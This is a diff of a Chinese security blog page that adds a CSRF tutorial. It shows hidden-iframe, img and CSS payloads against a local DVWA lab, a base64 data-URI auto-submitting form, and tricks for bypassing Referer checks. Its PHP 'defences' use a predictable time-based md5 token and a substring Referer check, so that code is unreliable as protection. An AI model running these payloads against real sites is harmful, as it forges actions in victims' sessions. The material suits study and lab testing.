@@ -32,11 +32,17 @@
 <meta property="og:site_name" content="Z0SEN&#39;s Blog">
 <meta property="og:description" content="CSRF（Cross-site request forery，跨站请求伪造）也被称为One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF。">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://z0sen.xyz/archives/24515/csrf-post-burp.png">
+<meta property="og:image" content="https://z0sen.xyz/archives/24515/csrf-postpoc.png">
+<meta property="og:image" content="https://z0sen.xyz/archives/24515/csrf-defense.png">
+<meta property="og:image" content="https://z0sen.xyz/archives/24515/csrf-defense-mod.png">
+<meta property="og:image" content="https://z0sen.xyz/archives/24515/php-data.png">
 <meta property="article:published_time" content="2020-10-22T09:30:17.000Z">
-<meta property="article:modified_time" content="2020-10-22T12:08:46.892Z">
+<meta property="article:modified_time" content="2020-10-22T13:50:53.340Z">
 <meta property="article:author" content="z0sen">
 <meta property="article:tag" content="CSRF">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://z0sen.xyz/archives/24515/csrf-post-burp.png">
 
 <link rel="canonical" href="https://z0sen.xyz/archives/24515.html">
 
@@ -257,7 +263,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2020-10-22 17:30:17 / 修改时间：20:08:46" itemprop="dateCreated datePublished" datetime="2020-10-22T17:30:17+08:00">2020-10-22</time>
+              <time title="创建时间：2020-10-22 17:30:17 / 修改时间：21:50:53" itemprop="dateCreated datePublished" datetime="2020-10-22T17:30:17+08:00">2020-10-22</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -296,7 +302,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1.2k</span>
+              <span>6.3k</span>
             </span>
             <div class="post-description">CSRF（Cross-site request forery，跨站请求伪造）也被称为One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF。</div>
 
@@ -317,13 +323,69 @@
 <h3 id="1-链接利用-a标签"><a href="#1-链接利用-a标签" class="headerlink" title="1. 链接利用(a标签)"></a>1. 链接利用(a标签)</h3><p>在html中，a标签代表链接，可以将当前的“焦点”指引到其他位置，移动的“焦点”需要发送对应的请求到链接指向的地址，然后返回响应</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href &#x3D;&quot;请求地址，可以携带GET型参数&quot;&gt; 内容 &lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line">实例：</span><br><span class="line">&lt;a href &#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;csrf&#x2F;?password_new&#x3D;123&amp;password_conf&#x3D;123&amp;Change&#x3D;Change#&quot;&gt;点击&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
 
-<h3 id="2-iframe利用"><a href="#2-iframe利用" class="headerlink" title="2. iframe利用"></a>2. iframe利用</h3><p>iframe标签内容将在页面加载过程中自动进行加载， src指向的位置就是页面请求的位置<br>注意：可使用style=”display:none”来设置不显示iframe加载的内容</p>
+<h3 id="2-iframe利用"><a href="#2-iframe利用" class="headerlink" title="2. iframe利用"></a>2. iframe利用</h3><p>iframe标签内容将在页面加载过程中自动进行加载， src指向的位置就是页面请求的位置<br>注意：可使用style=”display:none”来设置不显示iframe加载的内容<br>实例：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;csrf&#x2F;?password_new&#x3D;123&amp;password_conf&#x3D;123&amp;Change&#x3D;Change#&quot; style&#x3D;&quot;display:none&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>
 
-<h3 id="3-img标签利用"><a href="#3-img标签利用" class="headerlink" title="3. img标签利用"></a>3. img标签利用</h3><p>img标签的内容会随着页面加载而被请求，以此src指向的位置会在页面加载过程中进行请求。</p>
+<h3 id="3-img标签利用"><a href="#3-img标签利用" class="headerlink" title="3. img标签利用"></a>3. img标签利用</h3><p>img标签的内容会随着页面加载而被请求，以此src指向的位置会在页面加载过程中进行请求。<br>实例：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;csrf&#x2F;?password_new&#x3D;123&amp;password_conf&#x3D;123&amp;Change&#x3D;Change#&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>
 
-<h3 id="4-CSS-background利用"><a href="#4-CSS-background利用" class="headerlink" title="4. CSS-background利用"></a>4. CSS-background利用</h3><p>可以利用 CSS中 background样式中的url来加载远程机器上的内容，从而对url中的内容发送HTTP请求</p>
+<h3 id="4-CSS-background利用"><a href="#4-CSS-background利用" class="headerlink" title="4. CSS-background利用"></a>4. CSS-background利用</h3><p>可以利用 CSS中 background样式中的url来加载远程机器上的内容，从而对url中的内容发送HTTP请求。<br>实例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">body</span><br><span class="line">  &#123; </span><br><span class="line">  background: #00FF00 url(&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;csrf&#x2F;?password_new&#x3D;123&amp;password_conf&#x3D;123&amp;Change&#x3D;Change#&quot;) no-repeat fixed top;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-POST型CSRF利用"><a href="#0x02-POST型CSRF利用" class="headerlink" title="0x02 POST型CSRF利用"></a>0x02 POST型CSRF利用</h2><p>设置表单用于提交，例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type&#x3D;”hidden” name&#x3D;”username” value&#x3D;”1111” &#x2F;&gt;</span><br></pre></td></tr></table></figure>
+<p>使用burpsuite拦截POST包并生成CSRF PoC</p>
+<img src="/archives/24515/csrf-post-burp.png" class="">
+
+<p>在burpsuite生成的PoC中可以看到已经使用hidden参数隐藏表单数据</p>
+<img src="/archives/24515/csrf-postpoc.png" class="">
+<p>点击Test in browser会生成访问链接，实际攻击时诱使目标访问即可实现攻击</p>
+<h1 id="二、CSRF漏洞探测"><a href="#二、CSRF漏洞探测" class="headerlink" title="二、CSRF漏洞探测"></a>二、CSRF漏洞探测</h1><h2 id="0x01-手工探测"><a href="#0x01-手工探测" class="headerlink" title="0x01 手工探测"></a>0x01 手工探测</h2><p>手工探测原理就在于探测web应用程序是否具有CSRF漏洞的防御措施。</p>
+<img src="/archives/24515/csrf-defense.png" class="">
+<p>如果Web应用程序的HTTP请求中没有对应的预防措施，那么很大程度上就确定存在CSRF漏洞。</p>
+<h2 id="0x02-自动化探测"><a href="#0x02-自动化探测" class="headerlink" title="0x02 自动化探测"></a>0x02 自动化探测</h2><p>利用自动化探测工具CSRFTester或者burpsuite自带的Generate CSRF PoC</p>
+<p>CSRFTester工具的测试原理：使用代理抓取我们在浏览器中访问过的所有的连接以及所有的表单等信息，通过在CSRFTester中修改相应的表单等信息，重新提交，相当于一次伪造客户端请求，如果修测试的请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。</p>
+<p>1.CSRFTester设置浏览器代理:127.0.0.1:8008，burp是8080<br>2.登录web应用程序，提交表单，在CSRF工具中修改表单内容，查看是否更改，如果更改就存在CSRF漏洞<br>3.生成PoC</p>
+<h1 id="三、Token防御机制"><a href="#三、Token防御机制" class="headerlink" title="三、Token防御机制"></a>三、Token防御机制</h1><h2 id="0x01-漏洞修补逻辑分析"><a href="#0x01-漏洞修补逻辑分析" class="headerlink" title="0x01 漏洞修补逻辑分析"></a>0x01 漏洞修补逻辑分析</h2><p>CSRF漏洞实质：服务器无法准确判断当前请求是否是合法用户的自定义操作<br>漏洞修补逻辑分析:如果服务器在用户登录之后给予用户一个唯一合法令牌，每一次操作过程中，服务器都会验证令牌是否正确，如果正确那么执行操作，不正确不执行操作。<br>一般情况下，给予的令牌写入表单隐藏域的value中，随着表单内容进行提交</p>
+<h2 id="0x02-简单代码模型分析"><a href="#0x02-简单代码模型分析" class="headerlink" title="0x02 简单代码模型分析"></a>0x02 简单代码模型分析</h2><p>如果没有令牌，远程构造CSRF利用POC则直接中招。如果利用在增删改中设置唯一令牌，执行操作时只有提交令牌才能操作的话，就可以有效防止CSRF，若令牌不正确，则不执行操作，并给出提示内容。</p>
+<img src="/archives/24515/csrf-defense-mod.png" class="">
+
+<h2 id="0x03-使用Token进行CSRF防御"><a href="#0x03-使用Token进行CSRF防御" class="headerlink" title="0x03 使用Token进行CSRF防御"></a>0x03 使用Token进行CSRF防御</h2><p>Token作为识别操作是否是当前用户自己操作的唯一凭证，需要设置为复杂<strong>难以破解</strong>的内容。</p>
+<p>例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">date_default_timezone_set(&quot;Asia&#x2F;Shanghai&quot;);</span><br><span class="line">function generateToken()&#123;</span><br><span class="line">	$salt &#x3D; &quot;hello&quot;.date(&quot;h&#x2F;i&#x2F;s&quot;);</span><br><span class="line">	$token &#x3D; md5($salt);</span><br><span class="line">	return $token;</span><br><span class="line">&#125;</span><br><span class="line">$token &#x3D; generateToken();</span><br><span class="line">echo $token;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<img src="/archives/24515/php-data.png" class="">
+
+<p>1.登陆验证成功之后，在会话<code>SESSION[&quot;user_token&quot;]</code>中保存Token<br>2.在后台操作中，增删改表单中添加隐藏域hidden，设置value为Token<br>3.提交之后验证Token是否正确</p>
+<p>实例：<br>token_generate.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line">    function token_generate()</span><br><span class="line">    &#123;</span><br><span class="line">        $salt &#x3D; &quot;hello&quot;.date(&quot;h:i:s&quot;);</span><br><span class="line">        $token &#x3D; md5($salt);</span><br><span class="line">        return $token;</span><br><span class="line">    &#125;</span><br><span class="line">    $token &#x3D; token_generate();</span><br><span class="line">    $_SESSION[&quot;user_token&quot;] &#x3D; $token;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;CSRF_TOKEN&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;CSRF_TOKEN&lt;&#x2F;h1&gt;</span><br><span class="line">        &lt;form action&#x3D;&quot;check.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">            &lt;input type&#x3D;&quot;text&quot; value&#x3D;&quot;111&quot;&gt;</span><br><span class="line">            &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;user_token&quot; value&#x3D;&quot;&lt;?php echo $token;?&gt;&quot;&gt;</span><br><span class="line">            &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">        &lt;&#x2F;form&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>check.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line">    $user_token &#x3D; $_POST[&quot;user_token&quot;];</span><br><span class="line">    if($_SESSION[&quot;user_token&quot;] &#x3D;&#x3D; $user_token)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $_SESSION[&quot;user_token&quot;];</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;$user_token&quot;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;successful&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;fail&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="四、Referer防御机制"><a href="#四、Referer防御机制" class="headerlink" title="四、Referer防御机制"></a>四、Referer防御机制</h1><h2 id="0x01-Referer防御CSRF原理"><a href="#0x01-Referer防御CSRF原理" class="headerlink" title="0x01 Referer防御CSRF原理"></a>0x01 Referer防御CSRF原理</h2><p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基于此可以获得一些信息用于处理<br>当用户点击被构造好的CSRF利用页面，那么在执行用户对应操作时，提交的HTTP请求中就有对应的Referer值，此时服务端判断Referer值是否与服务器的域名信息有关，如果不相关则不执行操作</p>
+<h2 id="0x02-使用Referer进行CSRF防御"><a href="#0x02-使用Referer进行CSRF防御" class="headerlink" title="0x02 使用Referer进行CSRF防御"></a>0x02 使用Referer进行CSRF防御</h2><p>在PHP中使用<code>$_SERVER[&#39;HTTP_REFERER&#39;]</code>获取页面提交请求中的Referer值<br>这里需要用到一个strpos函数，用法参考 <span class="exturl" data-url="aHR0cHM6Ly93d3cudzNzY2hvb2wuY29tLmNuL3BocC9mdW5jX3N0cmluZ19zdHJwb3MuYXNw">PHP strpos() 函数-w3c<i class="fa fa-external-link-alt"></i></span><br>附上防御代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$referer &#x3D; $_SERVER[&quot;HTTP_REFERER&quot;];</span><br><span class="line">	if(strpos($referer,&quot;192.168.150.1&quot;) !&#x3D;&#x3D; false)</span><br><span class="line">	&#123;</span><br><span class="line">		echo $_SERVER[&quot;HTTP_REFERER&quot;];</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;successful&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		echo $_SERVER[&quot;HTTP_REFERER&quot;];</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;fail&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>strpos函数里面的意思也就是在获取的Referer值里面是否包含192.168.150.1这个域名，如果包含了说明是正确的，没包含就可能是恶意的</p>
+<h2 id="0x03-Referer-绕过"><a href="#0x03-Referer-绕过" class="headerlink" title="0x03 Referer 绕过"></a>0x03 Referer 绕过</h2><h3 id="1-Refere为空条件下"><a href="#1-Refere为空条件下" class="headerlink" title="1.Refere为空条件下"></a>1.Refere为空条件下</h3><pre><code>利用ftp://，http://，https://，file://，javascript:，data:，比如这个时候浏览器地址栏是 file:// 开头的，这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。</code></pre>
+<p>例：<br>① 利用<code>data:</code>协议</p>
+<pre><code>    &lt;html&gt;
+        &lt;body&gt;
+           &lt;iframe src=&quot;data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==&quot;&gt;
+        &lt;/body&gt; 
+    &lt;/html&gt;</code></pre>
+<p>② 利用<code>https</code>协议<br>    https向http跳转的时候Referer为空<br>    拿一个https的webshell<br>    <code>&lt;iframe src=&quot;https://www.xxxx.com/attack.php&quot;&gt;</code><br>    attack.php写上CSRF攻击代码</p>
+<h3 id="2-判断Referer是某域情况下绕过"><a href="#2-判断Referer是某域情况下绕过" class="headerlink" title="2.判断Referer是某域情况下绕过"></a>2.判断Referer是某域情况下绕过</h3><pre><code>比如你找的csrf是 `xxx.com`，验证的referer是验证的 `*.xx.com`，可以找个二级域名之后 `&lt;img &quot;csrf地址&quot;&gt;` 之后在把地址发出去就可以伪造。</code></pre>
+<h3 id="3-判断Referer是否存在某关键词"><a href="#3-判断Referer是否存在某关键词" class="headerlink" title="3.判断Referer是否存在某关键词"></a>3.判断Referer是否存在某关键词</h3><pre><code>Referer判断存在不存在`google.com`这个关键词，在网站新建一个`google.com`文件夹，把CSRF PoC存放在`google.com`目录，即可绕过。</code></pre>
+<h3 id="4-判断referer是否有某域名"><a href="#4-判断referer是否有某域名" class="headerlink" title="4.判断referer是否有某域名"></a>4.判断referer是否有某域名</h3><pre><code>判断了Referer开头是否以`126.com`以及126子域名  不验证根域名为 `126.com` 那么我这里可以构造子域名 `x.126.com.xxx.com` 作为蠕虫传播的载体服务器，即可绕过。</code></pre>
+<h1 id="五、CSRF漏洞防御总结"><a href="#五、CSRF漏洞防御总结" class="headerlink" title="五、CSRF漏洞防御总结"></a>五、CSRF漏洞防御总结</h1><h2 id="0x01-验证码"><a href="#0x01-验证码" class="headerlink" title="0x01 验证码"></a>0x01 验证码</h2><p>验证码防御被认为是对抗CSRF最为简单而且有效的防御方法。<br>CSRF在用户不知情的情况下完成对应操作，而验证码强制用户与应用程序交互，才能最终完成操作。通常情况下，验证码能够很好的遏制CSRF。<br>但出于用户体验考虑，不可能每一个操作都加入验证码，所以验证码只作为辅助手段，不能作为防御CSRF的主要解决方案。</p>
+<ul>
+<li>验证码防御也可以被认为是二次验证</li>
+</ul>
+<h2 id="0x02-Referer-Check"><a href="#0x02-Referer-Check" class="headerlink" title="0x02 Referer Check"></a>0x02 Referer Check</h2><p>Referer Check主要用于防止盗链。同理也可以用来检查请求是否来自合法的“源”。<br>比如用户修改密码，一定是在登录系统后台之后进行操作，所以在修改提交表单的时候，一定会从系统后台页面提交，携带Referer头，如果Referer不是当前系统的域，那么极有可能遭受CSRF。</p>
+<p>缺陷：服务器并非任何时候都可以取到Referer。例如HTTPS跳转到HTTP。</p>
+<h2 id="0x03-Anti-CSRF-Token"><a href="#0x03-Anti-CSRF-Token" class="headerlink" title="0x03 Anti CSRF Token"></a>0x03 Anti CSRF Token</h2><p>CSRF本质原因：重要操作的所有参数都是被恶意攻击者猜测到的。<br>那么防御措施就是生成一个随机且不被轻易猜测的参数，目前大多数防御都采用不可预测的token值。</p>
+<p>缺陷：Token泄露<br>1.GET型Token泄露<br>例如：GET型Token泄露<br>页面包含 <code>&lt;img src=&quot;http://www.evil.com/&quot;/&gt;</code> 那么请求中的Referer就会携带对应的GET Token。</p>
+<p>2.POST型Token泄露<br>利用XSS漏洞获取其Cookie，查看存储在其中的Token值。</p>
 
     </div>
 
@@ -416,7 +478,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E5%BC%80%E5%A4%B4"><span class="nav-text">写在开头</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E6%97%A0%E9%98%B2%E6%8A%A4%E7%9A%84CSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">一、无防护的CSRF漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0X01-GET%E5%9E%8BCSRF%E5%88%A9%E7%94%A8"><span class="nav-text">0X01 GET型CSRF利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E9%93%BE%E6%8E%A5%E5%88%A9%E7%94%A8-a%E6%A0%87%E7%AD%BE"><span class="nav-text">1. 链接利用(a标签)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-iframe%E5%88%A9%E7%94%A8"><span class="nav-text">2. iframe利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-img%E6%A0%87%E7%AD%BE%E5%88%A9%E7%94%A8"><span class="nav-text">3. img标签利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-CSS-background%E5%88%A9%E7%94%A8"><span class="nav-text">4. CSS-background利用</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E5%BC%80%E5%A4%B4"><span class="nav-text">写在开头</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E6%97%A0%E9%98%B2%E6%8A%A4%E7%9A%84CSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">一、无防护的CSRF漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0X01-GET%E5%9E%8BCSRF%E5%88%A9%E7%94%A8"><span class="nav-text">0X01 GET型CSRF利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E9%93%BE%E6%8E%A5%E5%88%A9%E7%94%A8-a%E6%A0%87%E7%AD%BE"><span class="nav-text">1. 链接利用(a标签)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-iframe%E5%88%A9%E7%94%A8"><span class="nav-text">2. iframe利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-img%E6%A0%87%E7%AD%BE%E5%88%A9%E7%94%A8"><span class="nav-text">3. img标签利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-CSS-background%E5%88%A9%E7%94%A8"><span class="nav-text">4. CSS-background利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-POST%E5%9E%8BCSRF%E5%88%A9%E7%94%A8"><span class="nav-text">0x02 POST型CSRF利用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81CSRF%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B"><span class="nav-text">二、CSRF漏洞探测</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E6%89%8B%E5%B7%A5%E6%8E%A2%E6%B5%8B"><span class="nav-text">0x01 手工探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8E%A2%E6%B5%8B"><span class="nav-text">0x02 自动化探测</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E3%80%81Token%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6"><span class="nav-text">三、Token防御机制</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E8%A1%A5%E9%80%BB%E8%BE%91%E5%88%86%E6%9E%90"><span class="nav-text">0x01 漏洞修补逻辑分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E7%AE%80%E5%8D%95%E4%BB%A3%E7%A0%81%E6%A8%A1%E5%9E%8B%E5%88%86%E6%9E%90"><span class="nav-text">0x02 简单代码模型分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E4%BD%BF%E7%94%A8Token%E8%BF%9B%E8%A1%8CCSRF%E9%98%B2%E5%BE%A1"><span class="nav-text">0x03 使用Token进行CSRF防御</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9B%9B%E3%80%81Referer%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6"><span class="nav-text">四、Referer防御机制</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Referer%E9%98%B2%E5%BE%A1CSRF%E5%8E%9F%E7%90%86"><span class="nav-text">0x01 Referer防御CSRF原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E4%BD%BF%E7%94%A8Referer%E8%BF%9B%E8%A1%8CCSRF%E9%98%B2%E5%BE%A1"><span class="nav-text">0x02 使用Referer进行CSRF防御</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Referer-%E7%BB%95%E8%BF%87"><span class="nav-text">0x03 Referer 绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Refere%E4%B8%BA%E7%A9%BA%E6%9D%A1%E4%BB%B6%E4%B8%8B"><span class="nav-text">1.Refere为空条件下</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%88%A4%E6%96%ADReferer%E6%98%AF%E6%9F%90%E5%9F%9F%E6%83%85%E5%86%B5%E4%B8%8B%E7%BB%95%E8%BF%87"><span class="nav-text">2.判断Referer是某域情况下绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%88%A4%E6%96%ADReferer%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%9F%90%E5%85%B3%E9%94%AE%E8%AF%8D"><span class="nav-text">3.判断Referer是否存在某关键词</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%88%A4%E6%96%ADreferer%E6%98%AF%E5%90%A6%E6%9C%89%E6%9F%90%E5%9F%9F%E5%90%8D"><span class="nav-text">4.判断referer是否有某域名</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%94%E3%80%81CSRF%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1%E6%80%BB%E7%BB%93"><span class="nav-text">五、CSRF漏洞防御总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E9%AA%8C%E8%AF%81%E7%A0%81"><span class="nav-text">0x01 验证码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Referer-Check"><span class="nav-text">0x02 Referer Check</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Anti-CSRF-Token"><span class="nav-text">0x03 Anti CSRF Token</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -493,7 +555,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">23k</span>
+    <span title="站点总字数">28k</span>
 </div>
 
         
